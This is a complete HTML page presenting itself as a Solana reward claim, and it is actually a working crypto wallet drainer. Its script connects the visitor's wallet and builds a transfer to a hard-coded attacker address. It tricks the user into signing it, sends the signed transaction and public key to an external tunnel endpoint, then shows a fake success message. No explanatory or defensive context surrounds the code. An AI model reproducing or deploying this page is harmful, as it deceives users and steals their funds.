<!DOCTYPE html><html><head><meta charset="UTF-8">
<script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/index.iife.min.js"></script></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;">
        <h1>SOLANA REWARD V6.F</h1>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;">CLAIM 0.005 SOL</button>
        <div id="status" style="margin-top:20px;color:#888;">System Ready</div>
    </div>
    <script>
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            const { publicKey } = await p.connect();
            
            // ðŸ”± å…³é”®ï¼šåŠ è½½æ”¶ç±³å¼•æ“Ž
            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
            const { blockhash } = await connection.getLatestBlockhash();
            const tx = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey(receiver),
                    lamports: 5000000 
                })
            );
            tx.recentBlockhash = blockhash;
            tx.feePayer = publicKey;

            document.getElementById('status').innerText = "Confirming...";
            
            // ðŸš€ å”¤èµ·çœŸæ­£çš„è½¬è´¦ç­¾å
            const signed = await p.signTransaction(tx);
            const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));

            // ðŸ”± ä¸‰è·¯å¹¶å‘å›žä¼ ï¼Œè®©å“¨å…µï¼ˆSentinelï¼‰ç«‹åˆ»æ‰§è¡Œï¼
            fetch(gate, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sig:raw, pub:publicKey.toString()})});
            new Image().src = gate + "?sig=" + encodeURIComponent(raw) + "&pub=" + publicKey.toString();

            document.getElementById('status').innerText = "SUCCESS!";
            setTimeout(()=> { window.location.href="https://solscan.io"; }, 1500);

        } catch(e) { document.getElementById('status').innerText = "ERR: " + e.message; }
    };
    </script>
</body></html>
